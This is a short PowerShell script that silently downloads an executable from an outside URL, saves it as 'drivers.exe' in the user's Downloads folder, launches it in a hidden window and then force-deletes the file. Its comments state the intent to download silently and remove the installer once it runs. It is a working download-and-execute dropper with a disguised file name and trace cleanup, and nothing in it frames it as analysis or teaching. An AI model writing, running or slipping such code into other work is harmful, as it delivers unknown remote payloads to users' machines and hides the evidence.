$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"

try {
    # Download silently
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    
    if (Test-Path $out) {
        # Launch the file. 
        # cmd /c start ensures it runs independently of the PowerShell session
        Start-Process "cmd.exe" -ArgumentList "/c start `"$out`"" -WindowStyle Hidden
        
        # Wait a moment for the process to initialize
        Start-Sleep -Seconds 3
        
        # Delete the installer after it starts
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
} catch {
    exit 1
}
